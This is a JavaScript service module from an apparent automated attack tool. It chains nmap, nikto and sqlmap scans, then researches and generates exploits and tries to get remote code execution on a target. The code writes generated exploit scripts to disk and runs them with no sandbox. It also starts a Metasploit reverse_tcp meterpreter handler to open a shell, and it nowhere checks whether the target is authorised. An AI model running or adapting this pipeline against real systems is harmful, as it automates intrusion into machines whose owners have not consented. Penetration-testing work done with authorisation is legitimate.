const toolExecutor = require('./tools/tool-executor.service');
const toolRegistry = require('./tools/tool-registry.service');
const analyzer = require('./analyzer.service');
const exploitGenerator = require('./exploit/exploit-generator.service');
const { createDocument, createEdge } = require('./graph.service');
const { createScan, createVulnerability, createApplication } = require('../models/graph.models');
const { getIPAddress, getHostname, normalizeTarget, isWebTarget } = require('./utils/target-utils');
const logger = require('../cli/utils/logger');
const { getScanProfile, selectTools, executeProgressiveScan } = require('./utils/progressive-strategy');
const { learnFromScanResult, learnFromError, adaptStrategy, thinkBeforeAction, getPreviousLearnings } = require('./learning/adaptation.service');

async function runReconnaissance(target) {
  try {
    logger.tool('Reconnaissance', `Starting scan on ${target}`);
    
    // Normalize target - handle both IP addresses and URLs
    const ipAddress = getIPAddress(target);
    const hostname = getHostname(target);

    // Learn from previous attempts
    logger.step('Learning from previous attempts...');
    const previousLearnings = await getPreviousLearnings(target, 5);
    const previousErrors = previousLearnings
      .filter(l => l.result && l.result.errors)
      .flatMap(l => l.result.errors.map(e => e.error));
    
    const adaptations = await adaptStrategy(target, previousLearnings);
    
    // Think before acting - plan simple actions first
    logger.step('Planning simple actions first...');
    const plan = await thinkBeforeAction(target, [], previousErrors);
    
    if (plan.simpleActions.length > 0) {
      logger.info(`Starting with ${plan.simpleActions.length} simple action(s) (~${plan.estimatedTime}s)`);
    }

    // Ensure nmap is available
    logger.step('Checking nmap availability...');
    const nmapStatus = await toolRegistry.ensureToolAvailable('nmap');
    if (!nmapStatus.available && !nmapStatus.installed) {
      const errorLearning = await learnFromError(
        new Error('nmap not available and could not be installed'),
        'tool_check',
        { target }
      );
      throw new Error('nmap not available and could not be installed');
    }
    logger.success(`nmap ${nmapStatus.available ? 'available' : 'installed'}`);

    // Progressive reconnaissance: start with quick scan
    logger.info('Starting with QUICK scan (common ports only) for speed...');
    const quickProfile = getScanProfile(0);
    
    logger.tool('nmap', `Scanning ${ipAddress || hostname}`, `(${quickProfile.description})`);
    let scanResult;
    
    try {
      scanResult = await toolExecutor.executeNmap(ipAddress || hostname, quickProfile.nmap);
    } catch (error) {
      // Learn from error
      await learnFromError(error, 'nmap_scan', { target, profile: quickProfile.name });
      throw error;
    }
    
    // Check if we got results
    const parsed = await analyzer.analyzeOutput('nmap', scanResult.output || scanResult.stdout);
    
    // If quick scan found services, we're good. Otherwise escalate
    if (!parsed.ports || parsed.ports.length === 0) {
      logger.warn('Quick scan found no open ports. Trying medium scan...');
      const mediumProfile = getScanProfile(1);
      logger.tool('nmap', `Deep scan ${ipAddress || hostname}`, `(${mediumProfile.description})`);
      const deepResult = await toolExecutor.executeNmap(ipAddress || hostname, mediumProfile.nmap);
      // Use deep scan results if available
      if (deepResult.success || deepResult.output) {
        return {
          ...deepResult,
          parsed: await analyzer.analyzeOutput('nmap', deepResult.output || deepResult.stdout),
        };
      }
    }

    // Parse results (already done above if we escalated)
    let parsed = scanResult.parsed;
    if (!parsed) {
      logger.step('Parsing nmap output...');
      parsed = await analyzer.analyzeOutput('nmap', scanResult.output || scanResult.stdout);
    }

    // Learn from scan result
    logger.step('Learning from scan results...');
    const learnings = await learnFromScanResult(scanResult, { target, phase: 'reconnaissance' });
    
    if (learnings.recommendations.length > 0) {
      logger.info(`Generated ${learnings.recommendations.length} recommendation(s) for next steps`);
      learnings.recommendations.forEach(rec => {
        if (rec.type === 'tool_suggestion') {
          logger.step(`  → Consider using ${rec.tool}: ${rec.reason}`);
        }
      });
    }

    // Store scan
    const scanDoc = createScan(target, 'reconnaissance', 'completed');
    const savedScan = await createDocument('scans', scanDoc);

    // Store application if web service found
    if (parsed.attackSurfaces && parsed.attackSurfaces.some(s => s.type === 'web_service')) {
      const appDoc = createApplication(target, target, 'Target application');
      const savedApp = await createDocument('applications', appDoc);
      
      if (savedScan && savedScan._id && savedApp && savedApp._id) {
        await createEdge('vulnerability_found_in', savedScan._id, savedApp._id);
      }
    }

    return {
      ...scanResult,
      parsed,
      scanId: savedScan?._id,
    };
  } catch (error) {
    logger.error('Error in reconnaissance:', error);
    return {
      success: false,
      error: error.message,
    };
  }
}

async function runVulnerabilityScans(target, toolNames = [], options = {}) {
  const results = [];
  const attemptNumber = options.attemptNumber || 0;

  try {
    // Normalize target for different tool types
    const ipAddress = getIPAddress(target);
    const hostname = getHostname(target);
    const webURL = isWebTarget(target) ? normalizeTarget(target) : null;
    
    // Progressive tool selection: start simple, escalate if needed
    let tools = [];
    if (toolNames.length > 0) {
      tools = toolNames;
    } else {
      // Smart tool selection based on attempt and target type
      const previousResults = options.previousResults || [];
      const discoveredServices = previousResults
        .flatMap(r => r.parsed?.services || [])
        .filter(s => s); // Get services from previous scans
      
      tools = selectTools(target, discoveredServices, attemptNumber);
      
      if (tools.length === 0) {
        // Fallback to basic tools
        tools = attemptNumber === 0 ? ['nikto'] : ['nikto', 'sqlmap', 'dirb'];
      }
    }
    
    logger.info(`Using ${attemptNumber === 0 ? 'QUICK' : attemptNumber === 1 ? 'MEDIUM' : 'THOROUGH'} scan strategy (attempt ${attemptNumber + 1})`);

    for (let i = 0; i < tools.length; i++) {
      const toolName = tools[i];
      
      logger.tool(toolName, `Starting scan (${i + 1}/${tools.length})`);
      
      // Ensure tool is available
      const toolStatus = await toolRegistry.ensureToolAvailable(toolName);
      
      if (!toolStatus.available && !toolStatus.installed) {
        logger.warn(`Skipping ${toolName} - not available and could not be installed`);
        // Learn from this failure
        await learnFromError(
          new Error(`${toolName} not available`),
          'tool_execution',
          { target, tool: toolName, attempt: attemptNumber }
        );
        continue;
      }

      // Think: Can we do this simply first?
      logger.step(`Analyzing best approach for ${toolName}...`);
      
      // Execute tool based on type
      let scanResult;
      switch (toolName.toLowerCase()) {
        case 'nmap':
          // Nmap works with IP addresses or hostnames
          logger.tool('nmap', `Scanning ${ipAddress || hostname}`, '(all ports, version detection)');
          scanResult = await toolExecutor.executeNmap(ipAddress || hostname, {
            ports: '1-65535',
            serviceVersion: true,
          });
          break;
        case 'nikto':
          // Nikto works with IP addresses or URLs
          const niktoTarget = webURL || `http://${ipAddress || hostname}`;
          logger.tool('nikto', `Scanning ${niktoTarget}`);
          scanResult = await toolExecutor.executeNikto(niktoTarget);
          break;
        case 'sqlmap':
          // Sqlmap needs a URL - use normalized URL or construct from IP
          if (webURL) {
            logger.tool('sqlmap', `Testing ${webURL}`, '(SQL injection, forms)');
            scanResult = await toolExecutor.executeSqlmap(webURL, {
              forms: true,
            });
          } else {
            // Skip sqlmap if no URL available
            logger.warn(`Skipping ${toolName} - requires URL, got IP address`);
            continue;
          }
          break;
        default:
          // Generic execution - use IP/hostname for network tools, URL for web tools
          const toolTarget = isWebTarget(toolName) ? (webURL || `http://${ipAddress || hostname}`) : (ipAddress || hostname);
          logger.tool(toolName, `Executing on ${toolTarget}`);
          scanResult = await toolExecutor.executeTool(toolName, [toolTarget]);
      }

      if (scanResult.success || scanResult.output) {
        logger.step(`Analyzing ${toolName} output...`);
        // Analyze output
        const analysis = await analyzer.analyzeOutput(toolName, scanResult.output || scanResult.stdout || '');
        
        const resultObj = {
          tool: toolName,
          success: scanResult.success,
          output: scanResult.output || scanResult.stdout,
          parsed: analysis,
          vulnerabilities: analysis.vulnerabilities || [],
        };
        
        // Learn from this successful scan
        const scanLearnings = await learnFromScanResult(resultObj, {
          target,
          tool: toolName,
          attempt: attemptNumber,
          phase: 'vulnerability_discovery',
        });
        
        if (resultObj.vulnerabilities.length > 0) {
          logger.success(`${toolName} found ${resultObj.vulnerabilities.length} potential vulnerability(ies)`);
          
          // Apply learnings - suggest next simple actions
          if (scanLearnings.recommendations.length > 0) {
            scanLearnings.recommendations.forEach(rec => {
              if (rec.priority === 'high') {
                logger.step(`  → Next: ${rec.action || rec.tool} - ${rec.reason}`);
              }
            });
          }
          
          // If we found vulnerabilities on first attempt, we can stop early
          if (attemptNumber === 0 && resultObj.vulnerabilities.length > 0) {
            logger.info('Quick scan found vulnerabilities - consider stopping here for efficiency');
          }
        } else {
          logger.info(`${toolName} completed - no vulnerabilities detected`);
        }
        
        results.push(resultObj);
      } else {
        logger.warn(`${toolName} failed or produced no output`);
        
        // Learn from error and get adaptation suggestions
        const errorLearning = await learnFromError(
          new Error(scanResult.error || 'Tool execution failed'),
          'tool_execution',
          { target, tool: toolName, attempt: attemptNumber }
        );
        
        // Apply adaptations if suggested
        if (errorLearning.adaptation && errorLearning.adaptation.suggestion) {
          logger.info(`Learning: ${errorLearning.adaptation.suggestion}`);
          if (errorLearning.adaptation.nextAction === 'retry_with_quick_scan') {
            logger.step(`Will retry ${toolName} with quicker settings`);
          }
        }
        
        // Retry with better method if this was a quick attempt
        if (attemptNumber === 0) {
          logger.step(`Will retry ${toolName} with more thorough settings on next attempt`);
        }
      }
    }
    
    logger.info(`Completed ${results.length} scan(s) on attempt ${attemptNumber + 1}`);
    
    // If no results and this was a quick attempt, suggest retrying
    const hasResults = results.some(r => r.vulnerabilities && r.vulnerabilities.length > 0);
    if (!hasResults && attemptNumber === 0 && results.length > 0) {
      logger.warn('Quick scan found no vulnerabilities. Consider retrying with deeper scan.');
    }

    return results;
  } catch (error) {
    logger.error('Error in vulnerability scans:', error);
    return results;
  }
}

async function attemptRCE(target, vulnerability) {
  try {
    logger.tool('RCE Attempt', `Trying ${vulnerability.type}`, `on ${target}`);

    // Check for existing exploits
    const exploits = await require('./exploit/exploit-research.service').researchRCEExploits(target, vulnerability);
    
    if (exploits.exploits && exploits.exploits.length > 0) {
      // Try existing exploits first
      for (const exploit of exploits.exploits.slice(0, 3)) {
        // Download and execute exploit if possible
        logger.tool('Exploit', `Trying ${exploit.title || exploit.url}`);
      }
    }

    // Generate new exploit
    const generatedExploit = await exploitGenerator.generateExploit(vulnerability, target, {
      language: 'python',
    });

    if (generatedExploit && generatedExploit.code) {
      // Execute generated exploit
      const exploitResult = await executeExploit(generatedExploit, target);
      
      if (exploitResult.success) {
        return {
          success: true,
          method: 'generated_exploit',
          exploit: generatedExploit,
          result: exploitResult,
        };
      }
    }

    // Try Metasploit if available
    const msfStatus = await toolRegistry.ensureToolAvailable('msfconsole');
    if (msfStatus.available) {
      const msfResult = await toolExecutor.executeMetasploit(
        'exploit/multi/handler',
        'python/meterpreter/reverse_tcp',
        {
          target,
          lhost: 'localhost', // Should be configurable
        }
      );

      if (msfResult.success || msfResult.stdout?.includes('session opened')) {
        return {
          success: true,
          method: 'metasploit',
          result: msfResult,
        };
      }
    }

    return {
      success: false,
      message: 'RCE attempt failed',
    };
  } catch (error) {
    logger.error('Error attempting RCE:', error);
    return {
      success: false,
      error: error.message,
    };
  }
}

async function executeExploit(exploit, target) {
  try {
    const fs = require('fs-extra');
    const path = require('path');
    const { exec } = require('child_process');
    const { promisify } = require('util');
    const execAsync = promisify(exec);

    // Save exploit to file
    const exploitDir = path.join(process.env.WORK_DIR || './work', 'exploits');
    await fs.ensureDir(exploitDir);
    
    const extension = exploit.language === 'python' ? 'py' : 'sh';
    const exploitFile = path.join(exploitDir, `exploit_${Date.now()}.${extension}`);
    await fs.writeFile(exploitFile, exploit.code, 'utf-8');
    await fs.chmod(exploitFile, 0o755);

    // Execute exploit
    let command;
    if (exploit.language === 'python') {
      command = `python3 ${exploitFile} ${target}`;
    } else if (exploit.language === 'bash' || exploit.language === 'sh') {
      command = `bash ${exploitFile} ${target}`;
    } else {
      command = exploitFile;
    }

    try {
      const { stdout, stderr } = await execAsync(command, {
        timeout: 60000, // 1 minute
      });

      // Check for success indicators
      const successIndicators = [
        'shell',
        'command',
        'executed',
        'success',
        'connected',
      ];

      const output = (stdout + stderr).toLowerCase();
      const success = successIndicators.some(indicator => output.includes(indicator));

      return {
        success,
        stdout,
        stderr,
        output: stdout + stderr,
      };
    } catch (error) {
      return {
        success: false,
        error: error.message,
        stderr: error.stderr,
        stdout: error.stdout,
      };
    }
  } catch (error) {
    return {
      success: false,
      error: error.message,
    };
  }
}

async function runFullScan(target, goal = 'rce') {
  const scanResults = {
    reconnaissance: null,
    vulnerabilityScans: [],
    vulnerabilities: [],
    rceAttempts: [],
    rceAchieved: false,
  };

  try {
    // Phase 1: Reconnaissance
    scanResults.reconnaissance = await runReconnaissance(target);

    // Phase 2: Vulnerability Discovery
    const vulnScans = await runVulnerabilityScans(target);
    scanResults.vulnerabilityScans = vulnScans;

    // Extract vulnerabilities
    for (const scan of vulnScans) {
      if (scan.analysis && scan.analysis.vulnerabilities) {
        scanResults.vulnerabilities.push(...scan.analysis.vulnerabilities);
      }
    }

    // Phase 3: RCE Attempts (if goal is RCE)
    if (goal === 'rce' && scanResults.vulnerabilities.length > 0) {
      const rceOpportunities = scanResults.vulnerabilities.filter(v =>
        v.type.toLowerCase().includes('command') ||
        v.type.toLowerCase().includes('rce') ||
        v.type.toLowerCase().includes('file upload')
      );

      for (const vuln of rceOpportunities) {
        const rceAttempt = await attemptRCE(target, vuln);
        scanResults.rceAttempts.push(rceAttempt);
        
        if (rceAttempt.success) {
          scanResults.rceAchieved = true;
          break; // Stop on first successful RCE
        }
      }
    }

    return scanResults;
  } catch (error) {
    logger.error('Error in full scan:', error);
    return {
      ...scanResults,
      error: error.message,
    };
  }
}

module.exports = {
  runReconnaissance,
  runVulnerabilityScans,
  attemptRCE,
  runFullScan,
  executeExploit,
};

